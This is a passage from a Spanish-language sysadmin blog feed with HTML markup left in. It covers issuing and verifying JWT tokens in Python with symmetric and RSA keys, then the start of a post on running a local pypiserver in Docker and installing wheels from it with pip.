    &lt;span class="s1"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;: datetime.datetime.utcnow&lt;span class="o"&gt;()&lt;/span&gt; + datetime.timedelta&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;seconds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;60&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
&lt;span class="o"&gt;}&lt;/span&gt;

print jwt.encode&lt;span class="o"&gt;(&lt;/span&gt;payload, KEY, &lt;span class="nv"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ cat simple_decode.py
import jwt
import datetime
import sys

&lt;span class="nv"&gt;KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sys.argv&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;TOKEN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sys.argv&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

print jwt.decode&lt;span class="o"&gt;(&lt;/span&gt;TOKEN, KEY, &lt;span class="nv"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En algún punto, expedimos un &lt;em&gt;token&lt;/em&gt; con un &lt;em&gt;secret&lt;/em&gt; dado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ python simple_encode.py secret gerard
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoxNTI5NDA1NTU0fQ.3KNRsiIEcOvxN5b8Tgv_5qd8_58nA91fCkPxmnNr9F0
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si lo intentamos verificar con el mismo &lt;em&gt;secret&lt;/em&gt;, no hay problema:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ python simple_decode.py secret eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoxNTI5NDA1NTU0fQ.3KNRsiIEcOvxN5b8Tgv_5qd8_58nA91fCkPxmnNr9F0
&lt;span class="o"&gt;{&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;: u&lt;span class="s1"&gt;&amp;#39;gerard&amp;#39;&lt;/span&gt;, u&lt;span class="s1"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;: &lt;span class="m"&gt;1529405554&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un &lt;em&gt;secret&lt;/em&gt; que no corresponde nos da un error, indicando que no es el &lt;em&gt;secret&lt;/em&gt; con el que ciframos y desciframos, seguramente porque nos han dado el cambiazo, y por lo tanto, rechazamos el &lt;em&gt;token&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ python simple_decode.py badsecret eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoxNTI5NDA1NTU0fQ.3KNRsiIEcOvxN5b8Tgv_5qd8_58nA91fCkPxmnNr9F0
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
...
jwt.exceptions.InvalidSignatureError: Signature verification failed
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si dejamos pasar el tiempo de expiración, el &lt;em&gt;token&lt;/em&gt; también pasa a ser inválido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ python simple_decode.py secret eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoxNTI5NDA1NTU0fQ.3KNRsiIEcOvxN5b8Tgv_5qd8_58nA91fCkPxmnNr9F0
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
...
jwt.exceptions.ExpiredSignatureError: Signature has expired
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma podemos estar seguros que no se ha generado un &lt;em&gt;token&lt;/em&gt; por un tercero, y que el que dimos no ha sido modificado.&lt;/p&gt;
&lt;h2&gt;Creando un token con una clave asimétrica&lt;/h2&gt;
&lt;p&gt;Se trata de un caso un poco más complicado: un servicio genera el &lt;em&gt;token&lt;/em&gt; y otros lo consumen. En estos casos conviene que solo uno pueda cifrar, y todos puedan verificarlo; de esta forma, una API comprometida no expone el algoritmo de encriptación y evitamos suplantaciones.&lt;/p&gt;
&lt;p&gt;Este caso se utiliza en esquemas de &lt;em&gt;single sign on&lt;/em&gt;, en donde un servicio de autenticación genera el &lt;em&gt;token&lt;/em&gt;, indicando a qué aplicaciones tiene acceso un usuario. La responsabilidad de verificar el permiso recae en cada aplicación individual.&lt;/p&gt;
&lt;p&gt;&lt;img alt="JWT de clave asimétrica" src="http://www.linuxsysadmin.ml/images/JWT_Single_Sign_On.png"&gt;&lt;/p&gt;
&lt;p&gt;Vamos a asegurarnos que tenemos las librerías &lt;strong&gt;python&lt;/strong&gt; necesarias:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ pip freeze
...
&lt;span class="nv"&gt;PyJWT&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.6.4
&lt;span class="nv"&gt;cryptography&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.2.2
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;También vamos a necesitar el par de claves RSA:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ openssl genrsa -out private.pem &lt;span class="m"&gt;1024&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;1024&lt;/span&gt; bit long modulus
...........................++++++
...........................++++++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x010001&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ openssl rsa -in private.pem -pubout -out public.pem
writing RSA key
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que la clave privada se queda en el servidor de autenticación, de forma que &lt;strong&gt;puede cifrar&lt;/strong&gt;. La parte publica es para todas las aplicaciones que necesiten &lt;strong&gt;verificar&lt;/strong&gt; el &lt;em&gt;token&lt;/em&gt;. De esta forma solo una puede expedir &lt;em&gt;tokens&lt;/em&gt;, y por lo tanto, es el único punto de &lt;em&gt;hacking&lt;/em&gt; del sistema distribuído.&lt;/p&gt;
&lt;p&gt;En el servidor de autenticación haríamos algo así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_new_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;expire&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timedelta&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;EXPIRE_SECONDS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;permissions&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;expire&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;jwt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JWT_PRIVATE_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RS256&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mientras que si el usuario facilita un &lt;em&gt;token&lt;/em&gt; a una aplicación, esta hará algo como:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;extract_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;decoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jwt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JWT_PUBLIC_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;algorithms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RS256&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;decoded&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma se puede validar el &lt;em&gt;token&lt;/em&gt;, que sea correcto, no se haya modificado, no esté expirado y con la seguridad que solo lo pudo generar el servidor de autenticación. No hace falta para nada ir a la base de datos, o pedir una verificación al creador del &lt;em&gt;token&lt;/em&gt;. Lo único que no verifica este método es si el &lt;em&gt;payload&lt;/em&gt; incluye permisos para  el uso del método de la API solicitado.&lt;/p&gt;</content><category term="JWT"></category><category term="token"></category><category term="api"></category><category term="REST"></category><category term="autenticación"></category></entry><entry><title>Un servidor pypi local con Docker</title><link href="http://www.linuxsysadmin.ml/2018/07/un-servidor-pypi-local-con-docker.html" rel="alternate"></link><published>2018-07-09T09:00:00+02:00</published><updated>2018-07-09T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-09:/2018/07/un-servidor-pypi-local-con-docker.html</id><summary type="html">&lt;p&gt;Estaba yo el otro día investigando una nueva librería de &lt;strong&gt;python&lt;/strong&gt;, pero necesitaba de otra librería que se compilaba. Harto de perder el tiempo compilando cada vez esta librería, recuperé un antiguo artículo que me permitía distribuir el archivo &lt;em&gt;wheel&lt;/em&gt; ya compilado tantas veces yo quisiera; como no, usando &lt;strong&gt;docker …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Estaba yo el otro día investigando una nueva librería de &lt;strong&gt;python&lt;/strong&gt;, pero necesitaba de otra librería que se compilaba. Harto de perder el tiempo compilando cada vez esta librería, recuperé un antiguo artículo que me permitía distribuir el archivo &lt;em&gt;wheel&lt;/em&gt; ya compilado tantas veces yo quisiera; como no, usando &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El artículo anterior es &lt;a href="http://www.linuxsysadmin.ml/2016/09/un-servidor-pypi-local.html"&gt;este&lt;/a&gt;, y su único objetivo era montar un servidor de &lt;strong&gt;pypi&lt;/strong&gt; local que nos permite alojar nuestros ficheros &lt;em&gt;wheel&lt;/em&gt;, aunque funciona genial para evitar múltiples compilaciones y como &lt;em&gt;caché&lt;/em&gt; de paquetes.&lt;/p&gt;
&lt;h2&gt;El servidor pypi&lt;/h2&gt;
&lt;p&gt;Para facilitar el montaje y la distribución de este servidor, se ha decidido hacer una imagen de &lt;strong&gt;docker&lt;/strong&gt; para encapsular lo necesario; de paso, el fichero &lt;em&gt;Dockerfile&lt;/em&gt; es una magnífica receta para evitar un montón de pasos manuales que salían en el artículo citado.&lt;/p&gt;
&lt;p&gt;El fichero &lt;em&gt;Dockerfile&lt;/em&gt; no puede ser más explícito; puesto que necesitamos instalar &lt;strong&gt;pypiserver&lt;/strong&gt; mediante &lt;strong&gt;pip&lt;/strong&gt;, los instalamos. También se define el comando que va a levantar el servidor y se crea la carpeta en donde deben residir nuestros paquetes. No veo muy útil crear un &lt;em&gt;virtualenv&lt;/em&gt;; un contenedor &lt;strong&gt;docker&lt;/strong&gt; ya es un entorno aislado en sí mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ cat Dockerfile 
FROM alpine:3.7
RUN apk add --no-cache py2-pip tini &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    pip install pypiserver &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /srv/packages
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/sbin/tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/pypi-server&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/srv/packages&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El binario &lt;code&gt;pypi-server&lt;/code&gt; no cumple como un &lt;em&gt;init&lt;/em&gt; correcto, y el contenedor no acaba hasta que &lt;strong&gt;docker&lt;/strong&gt; lo mata. Para evitar ese problema, vamos a utilizar &lt;strong&gt;tini&lt;/strong&gt;, tal y como explicamos en &lt;a href="http://www.linuxsysadmin.ml/2017/09/un-proceso-inicial-para-docker-tini-y-dumb-init.html"&gt;otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Construimos la imagen con los comando habituales y le damos un &lt;em&gt;tag&lt;/em&gt; para su fácil uso cuando lo queramos levantar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ docker build -t pypiserver .
...
Successfully tagged pypiserver:latest
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo queda revisar que la imagen existe y que su tamaño tiene sentido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
pypiserver          latest              ad483ac352d7        &lt;span class="m"&gt;56&lt;/span&gt; seconds ago      &lt;span class="m"&gt;52&lt;/span&gt;.8MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.7                 3fd9065eaf02        &lt;span class="m"&gt;5&lt;/span&gt; months ago        &lt;span class="m"&gt;4&lt;/span&gt;.15MB
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para el &lt;em&gt;runtime&lt;/em&gt;, vamos a utilizar &lt;em&gt;docker-compose&lt;/em&gt; para reducir la longitud del comando de levantamiento, dejándolo todo explícitamente declarado en el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La otra decisión de diseño es servir los &lt;em&gt;wheels&lt;/em&gt; desde una carpeta local, en donde podemos ponerlos y quitarlos con gran facilidad. Solo necesitamos declarar la carpeta para los paquetes, que voy a poner en la misma carpeta del &lt;em&gt;docker-compose.yml&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ tree
.
├── packages
├── docker-compose.yml
└── Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En el &lt;em&gt;docker-compose.yml&lt;/em&gt; nos limitamos a montar la carpeta local como volumen y publicar el puerto del contenedor en nuestro servidor; esto hará el contenedor transparente a los ojos del resto de servidores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  pypiserver:
    image: pypiserver
    container_name: pypiserver
    hostname: pypiserver
    volumes:
      - ./packages:/srv/packages:ro
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:8080&amp;quot;&lt;/span&gt;
    restart: always
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya no falta nada para levantarlo todo y lo hacemos sin más preámbulo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;pypiserver_default&amp;quot;&lt;/span&gt; with the default driver
Creating pypiserver
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos el servidor funcional.&lt;/p&gt;
&lt;h2&gt;Rellenando nuestro servidor de paquetes&lt;/h2&gt;
&lt;p&gt;El único requisito para poder servir paquetes es dejarlos en la carpeta que a ese fin hemos destinado. No es importante como llegan los paquetes ahí; podemos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Descargarlos de &lt;a href="https://pypi.org/"&gt;https://pypi.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Pescarlos de nuestra caché local en &lt;code&gt;~/.cache/pip/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Obtenerlos mediante &lt;code&gt;pip wheel&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En este caso vamos a utilizar el tercer método. Como no tengo &lt;strong&gt;pip&lt;/strong&gt; instalado en mi servidor, y para demostrar que solo necesito los fichero &lt;em&gt;wheel&lt;/em&gt;, voy a utilizar el &lt;strong&gt;pip&lt;/strong&gt; de un &lt;em&gt;virtualenv&lt;/em&gt; temporal, que destruiré al acabar. Otra opción sería crear un contenedor que los dejara en esa carpeta, que también montaría como un volumen.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ virtualenv env
Running virtualenv with interpreter /usr/bin/python2
New python executable in env/bin/python2
Also creating executable in env/bin/python
Installing setuptools, pip...done.
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ni siquiera hace falta activar el &lt;em&gt;virtualenv&lt;/em&gt;. Lo único que hace el &lt;em&gt;script&lt;/em&gt; de activación es poner la carpeta &lt;em&gt;bin/&lt;/em&gt; en el &lt;em&gt;PATH&lt;/em&gt;, pero para lanzar el comando una vez no lo necesito...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ ./env/bin/pip wheel -w packages/ falcon mongoengine
...
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando &lt;code&gt;pip wheel&lt;/code&gt; solo descarga los paquetes y los convierte en &lt;em&gt;wheels&lt;/em&gt;, y los deja en la carpeta indicada, que es desde donde los servimos. Como ya tenemos lo que queríamos (los &lt;em&gt;wheels&lt;/em&gt;), podemos eliminar el &lt;em&gt;virtualenv&lt;/em&gt;, que nos deja la carpeta limpia de cosas innecesarias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ rm -R env/
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que solo hemos conservado los ficheros &lt;em&gt;wheel&lt;/em&gt; solicitados y sus dependencias; no hay más que lo estrictamente necesario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/pypiserver$ tree
.
├── packages
│   ├── falcon-1.4.1-py2.py3-none-any.whl
│   ├── mongoengine-0.15.0-py2-none-any.whl
│   ├── pymongo-3.6.1-cp27-none-linux_x86_64.whl
│   ├── python_mimeparse-1.6.0-py2.py3-none-any.whl
│   └── six-1.11.0-py2.py3-none-any.whl
├── docker-compose.yml
└── Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;7&lt;/span&gt; files
gerard@sirius:~/workspace/pypiserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Usando nuestro servidor local&lt;/h2&gt;
&lt;p&gt;El comando &lt;strong&gt;pip&lt;/strong&gt; nos ofrece dos formas de añadir nuestro servidor: como URL única o como URL añadida a la normal. Haced un &lt;code&gt;pip install --help&lt;/code&gt; para más detalles. Yo me decanto por usar solamente mi servidor, que aparentemente, tiene todo lo que necesito.&lt;/p&gt;
&lt;p&gt;Supongamos que necesito el paquete &lt;strong&gt;falcon&lt;/strong&gt; en el servidor &lt;strong&gt;snowy&lt;/strong&gt;; lo instalamos con nuestro servidor local (&lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-i&lt;/code&gt;) y punto. Observad las URLs de las que se descarga el paquete:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@snowy:~# pip install --trusted-host &lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 -i http://172.17.0.1:8080/ falcon
Looking in indexes: http://172.17.0.1:8080/
Collecting falcon
  Downloading http://172.17.0.1:8080/packages/falcon-1.4.1-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;159kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 163kB &lt;span class="m"&gt;7&lt;/span&gt;.8MB/s 
Collecting six&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.4.0 &lt;span class="o"&gt;(&lt;/span&gt;from falcon&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://172.17.0.1:8080/packages/six-1.11.0-py2.py3-none-any.whl
Collecting python-mimeparse&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.5.2 &lt;span class="o"&gt;(&lt;/span&gt;from falcon&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://172.17.0.1:8080/packages/python_mimeparse-1.6.0-py2.py3-none-any.whl
Installing collected packages: six, python-mimeparse, falcon
Successfully installed falcon-1.4.1 python-mimeparse-1.6.0 six-1.11.0
root@snowy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: El servidor local es HTTP plano, lo que lo convierte en un servidor no confiable; eso nos obliga  a poner el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--trusted-host&lt;/code&gt; para que &lt;strong&gt;pip&lt;/strong&gt; lo quiera usar. Otra opción sería utilizar HTTPS, lo que implica poner un &lt;em&gt;proxy reverso&lt;/em&gt; delante, por ejemplo con &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Otro servidor podría querer descargar los mismos paquetes u otros sin que eso nos repercuta en problemas, tal y como esperamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@stormy:~# pip install --trusted-host &lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 -i http://172.17.0.1:8080/ mongoengine
Looking in indexes: http://172.17.0.1:8080/
Collecting mongoengine
  Downloading http://172.17.0.1:8080/packages/mongoengine-0.15.0-py2-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;99kB&lt;span class="o"&gt;)&lt;/span&gt;
